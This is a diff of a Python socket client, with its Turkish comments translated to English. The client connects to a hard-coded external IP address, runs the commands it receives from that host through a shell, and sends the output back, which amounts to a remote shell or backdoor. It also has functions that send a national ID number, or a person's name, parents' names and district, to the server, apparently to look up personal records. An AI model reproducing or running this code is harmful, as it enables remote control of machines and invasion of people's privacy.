@@ -9,7 +9,7 @@ def create_client_socket():
     global client_socket
     if client_socket is None:
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client_socket.connect(('87.248.157.112', 65432))  # Sunucu IP ve portunu ayarla
+        client_socket.connect(('87.248.157.112', 65432))  # Set server IP and port
 
 def close_client_socket():
     global client_socket
@@ -31,16 +31,14 @@ def connected():
             process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             stdout, stderr = process.communicate()
 
-            # stdout ve stderr'i birleştir ve decode et
-            output = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')
+            # Combine stdout and stderr
+            output = stdout + stderr
 
-            # Veriyi parça parça gönder
-            chunk_size = 1024  # Her parçada gönderilecek veri miktarı
+            # Send data in chunks
+            chunk_size = 1024
             for i in range(0, len(output), chunk_size):
-                client_socket.send(output[i:i + chunk_size].encode())
-            client_socket.send("Bitti".encode())
- 
-                
+                client_socket.send(output[i:i + chunk_size])
+            client_socket.send(b"Bitti")
 
 def send_request(command, *args):
     buffer = []
@@ -48,14 +46,14 @@ def send_request(command, *args):
     request_data = f"{command}|" + "|".join(args)
     client_socket.send(request_data.encode())
     while True:
-        data = client_socket.recv(1024).decode()  # Her seferde 1024 byte al
-        if data == "Bitti":
+        data = client_socket.recv(1024)
+        if data == b"Bitti":
             break
-        buffer.append(data.decode('utf-8', errors='ignore'))
-    output = ''.join(buffer)
+        buffer.append(data)
+    output = b''.join(buffer)
     
     try:
-        return json.loads(output)
+        return json.loads(output.decode('utf-8'))
     except json.JSONDecodeError:
         return {"error": "Lütfen Daha Fazla Bilgi Verin"}
 
@@ -67,5 +65,3 @@ def aile(tc, token):
 
 def kisi(ad, soyad, annead, babaad, il, ilce, token):
     return send_request("kisi", ad, soyad, annead, babaad, il, ilce, token)
-
-# Program sonlandığında client socket'i kapatmak için
